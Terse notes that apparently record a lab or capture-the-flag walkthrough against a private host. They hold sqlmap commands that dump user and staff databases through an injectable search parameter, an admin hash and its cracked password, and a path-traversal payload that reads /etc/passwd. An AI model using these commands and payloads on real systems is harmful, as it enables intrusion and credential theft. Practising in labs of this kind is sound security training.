#found only one port open

#search parameter vulnerable to sql injection

#used this command to get user/pass:
	sqlmap -r req.txt -D users -T UserDetails --dump-all --batch

#used this command to get staff details:
	sqlmap -r req.txt http://192.168.10.13 -D Staff --dump-all --dump-all --batch

#in staff database one pass found in hash:
	admin:856f5de590ef37314e7c3bdf6f8a66dc

#cracked pass using crackstation:
	admin:transorbital1

#inside the admin pannel we found a LFI on:
	http://192.168.10.13/manage.php?file=../../../../../../../../../../etc/passwd

